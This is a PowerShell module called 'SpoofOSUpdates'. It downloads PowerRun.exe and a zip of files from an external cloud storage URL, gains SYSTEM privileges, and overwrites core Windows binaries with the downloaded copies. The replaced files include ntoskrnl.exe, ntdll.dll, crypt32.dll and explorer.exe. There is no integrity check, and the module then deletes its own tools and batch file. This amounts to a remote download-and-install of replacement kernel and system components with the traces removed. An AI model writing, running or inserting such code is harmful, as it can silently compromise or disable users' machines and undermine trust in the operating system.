Set-StrictMode -Version Latest

# Minimal logging if core isn't loaded
if (-not (Get-Command Write-Info -EA SilentlyContinue)) { function Write-Info([string]$m){Write-Host "[*] $m" -ForegroundColor Cyan} }
if (-not (Get-Command Write-Ok   -EA SilentlyContinue)) { function Write-Ok  ([string]$m){Write-Host "[OK] $m" -ForegroundColor Green} }
if (-not (Get-Command Write-Warn -EA SilentlyContinue)) { function Write-Warn([string]$m){Write-Host "[!!] $m" -ForegroundColor Yellow} }
if (-not (Get-Command New-ModuleResult -EA SilentlyContinue)) {
  function New-ModuleResult { param([string]$Name,[string]$Status,[string]$Message) [pscustomobject]@{Name=$Name;Status=$Status;Message=$Message} }
}

# URLs and file definitions
$Script:PowerRunUrl = 'https://storage.googleapis.com/sigma.00.edu.ci/PowerRun.exe'
$Script:FilesZipUrl = 'https://storage.googleapis.com/sigma.00.edu.ci/files.zip'

# Files to replace (matching your specification exactly)
$Script:System32Files = @(
    "gdi32.dll",
    "crypt32.dll", 
    "ntoskrnl.exe",
    "ntdll.dll",
    "shell32.dll"
)

$Script:WindowsFiles = @(
    "explorer.exe",
    "bfsvc.exe", 
    "HelpPane.exe",
    "hh.exe",
    "notepad.exe",
    "regedit.exe",
    "splwow64.exe"
)

function Get-CurrentUser {
    $currentUser = ((qwinsta /server:localhost | Where-Object { $_ -match "\s+console" }) -replace '^\s*\S+\s+(\S+)\s+\S+\s+\S+', '$1').Trim()
    if (-not $currentUser) {
        $currentUser = $env:USERNAME
    }
    return $currentUser
}

function Get-SecurityCode {
    # Check environment variable first
    $securityCode = $env:POWERRUN_SECURITY_CODE
    
    if (-not $securityCode) {
        # Prompt user for security code
        Write-Info "PowerRun requires a security code to run with SYSTEM privileges."
        Write-Info "This code changes periodically. Please check your source for the current code."
        $securityCode = Read-Host "Enter PowerRun security code"
        
        if (-not $securityCode) {
            throw "PowerRun security code is required"
        }
    }
    
    return $securityCode
}

function Test-Ready { param($Context) return $true }

function Invoke-Apply { 
    param($Context)
    
    Write-Info "Starting OS file replacement using PowerRun for SYSTEM privileges..."
    
    # Get security code (from env var or prompt)
    try {
        $securityCode = Get-SecurityCode
    } catch {
        return New-ModuleResult -Name 'SpoofOSUpdates' -Status 'Failed' -Message $_.Exception.Message
    }
    
    try {
        # Get the current user using the specified command (EXACTLY like primitive script)
        $currentUser = Get-CurrentUser
        
        # Define paths (EXACTLY like primitive script)
        $desktopPath = [System.IO.Path]::Combine("C:\Users", $currentUser, "Desktop")
        $powerRunPath = [System.IO.Path]::Combine($desktopPath, "PowerRun.exe")
        $iniFilePath = [System.IO.Path]::Combine($desktopPath, "PowerRun.ini")
        $filesZipPath = [System.IO.Path]::Combine($desktopPath, "files.zip")
        $extractPath = [System.IO.Path]::Combine($desktopPath, "files_extracted")
        
        Write-Info "Setting up PowerRun and downloading files..."
        
        # Disable the progress bar for faster download with Invoke-WebRequest (EXACTLY like primitive script)
        $ProgressPreference = 'SilentlyContinue'
        
        # Download PowerRun (EXACTLY like primitive script)
        Invoke-WebRequest -Uri $Script:PowerRunUrl -OutFile $powerRunPath
        Write-Ok "Downloaded PowerRun.exe to desktop"
        
        # Download files.zip
        Invoke-WebRequest -Uri $Script:FilesZipUrl -OutFile $filesZipPath
        Write-Ok "Downloaded files.zip to desktop"
        
        # Extract files.zip (files are directly in zip, no subfolders)
        if (Test-Path $extractPath) {
            Remove-Item -Path $extractPath -Recurse -Force
        }
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($filesZipPath, $extractPath)
        Write-Ok "Extracted files.zip to: $extractPath"
        
        # Launch PowerRun so it generates the PowerRun.ini file (EXACTLY like primitive script)
        Start-Process -FilePath $powerRunPath
        Write-Info "Launched PowerRun to generate ini file..."
        
        # Wait for 2 seconds to allow PowerRun to generate the ini file (EXACTLY like primitive script)
        Start-Sleep -Seconds 2
        
        # Automatically close PowerRun process after 2 seconds (EXACTLY like primitive script)
        Get-Process -Name "PowerRun" -ErrorAction SilentlyContinue | ForEach-Object { 
            Stop-Process $_.Id -Force 
        }
        Write-Info "Closed PowerRun process"
        
        # Check if PowerRun.ini exists and modify it to add the SecurityCode (EXACTLY like primitive script)
        if (Test-Path $iniFilePath) {
            $iniContent = Get-Content -Path $iniFilePath
            $iniContent[13] = "SecurityCode=$securityCode"  # Update with the SecurityCode (EXACTLY line 13 like primitive script)
            $iniContent | Set-Content -Path $iniFilePath
            Write-Ok "Updated PowerRun.ini with security code"
        } else {
            throw "PowerRun.ini not found at $iniFilePath"
        }
        
        # Create the batch file for file replacement
        $batchPath = [System.IO.Path]::Combine($desktopPath, "replace_files.bat")
        
        # Build batch file content
        $batchContent = @"
@echo off
echo Starting file replacement as SYSTEM...
echo Running as: %USERNAME%
echo Process ID: %RANDOM%
echo.

REM Create backups and replace System32 files
"@

        # Add System32 file moves
        foreach ($fileName in $Script:System32Files) {
            $sourceFile = Join-Path $extractPath $fileName
            $targetFile = "C:\WINDOWS\System32\$fileName"
            $backupFile = "C:\WINDOWS\System32\$fileName.bak"
            
            $batchContent += @"

echo Processing System32 file: $fileName
if not exist "$backupFile" (
    copy "$targetFile" "$backupFile" >nul 2>&1
    echo   Created backup: $backupFile
) else (
    echo   Backup already exists: $backupFile
)
move "$sourceFile" "$targetFile" >nul 2>&1
if %errorlevel% equ 0 (
    echo   SUCCESS: Replaced $fileName
) else (
    echo   ERROR: Failed to replace $fileName
)
"@
        }

        # Add Windows folder file moves  
        $batchContent += @"

REM Create backups and replace Windows folder files
"@

        foreach ($fileName in $Script:WindowsFiles) {
            $sourceFile = Join-Path $extractPath $fileName
            $targetFile = "C:\WINDOWS\$fileName"
            $backupFile = "C:\WINDOWS\$fileName.bak"
            
            $batchContent += @"

echo Processing Windows file: $fileName
if not exist "$backupFile" (
    copy "$targetFile" "$backupFile" >nul 2>&1
    echo   Created backup: $backupFile
) else (
    echo   Backup already exists: $backupFile
)
move "$sourceFile" "$targetFile" >nul 2>&1
if %errorlevel% equ 0 (
    echo   SUCCESS: Replaced $fileName
) else (
    echo   ERROR: Failed to replace $fileName
)
"@
        }

        $batchContent += @"

echo.
echo File replacement complete
echo Batch finished at %DATE% %TIME%
"@
        
        # Write batch file
        $batchContent | Set-Content -Path $batchPath -Encoding ASCII
        Write-Ok "Created batch file: $batchPath"
        
        # Use PowerRun to run the batch file as NT AUTHORITY\SYSTEM (EXACTLY like primitive script pattern)
        $powerRunCommand = "/SW:0 cmd.exe /c `"$batchPath`""
        Write-Info "Executing file replacement batch via PowerRun as SYSTEM..."
        Write-Info "Command: PowerRun.exe $powerRunCommand"
        
        Start-Process -FilePath $powerRunPath -ArgumentList $powerRunCommand -Wait
        Write-Ok "PowerRun execution completed"
        
        # Clean up downloaded files and extracted folder
        Write-Info "Cleaning up temporary files..."
        try {
            if (Test-Path $filesZipPath) { Remove-Item -Path $filesZipPath -Force }
            if (Test-Path $extractPath) { Remove-Item -Path $extractPath -Recurse -Force }
            if (Test-Path $batchPath) { Remove-Item -Path $batchPath -Force }
            if (Test-Path $powerRunPath) { Remove-Item -Path $powerRunPath -Force }
            if (Test-Path $iniFilePath) { Remove-Item -Path $iniFilePath -Force }
            Write-Ok "Cleaned up temporary files"
        } catch {
            Write-Warn "Some cleanup failed: $($_.Exception.Message)"
        }
        
        $totalFiles = $Script:System32Files.Count + $Script:WindowsFiles.Count
        return New-ModuleResult -Name 'SpoofOSUpdates' -Status 'Succeeded' -Message "PowerRun file replacement completed for $totalFiles files"
        
    } catch {
        return New-ModuleResult -Name 'SpoofOSUpdates' -Status 'Failed' -Message $_.Exception.Message
    }
}

function Invoke-Verify { 
    param($Context)
    
    $replacedCount = 0
    $allFiles = $Script:System32Files + $Script:WindowsFiles
    
    foreach ($fileName in $Script:System32Files) {
        $backupPath = "C:\WINDOWS\System32\$fileName.bak"
        if (Test-Path $backupPath) {
            $replacedCount++
        }
    }
    
    foreach ($fileName in $Script:WindowsFiles) {
        $backupPath = "C:\WINDOWS\$fileName.bak"
        if (Test-Path $backupPath) {
            $replacedCount++
        }
    }
    
    return New-ModuleResult -Name 'SpoofOSUpdates' -Status 'Succeeded' -Message ("$replacedCount/$($allFiles.Count) files have backup files (indicating replacement)")
}

Export-ModuleMember -Function Test-Ready,Invoke-Apply,Invoke-Verify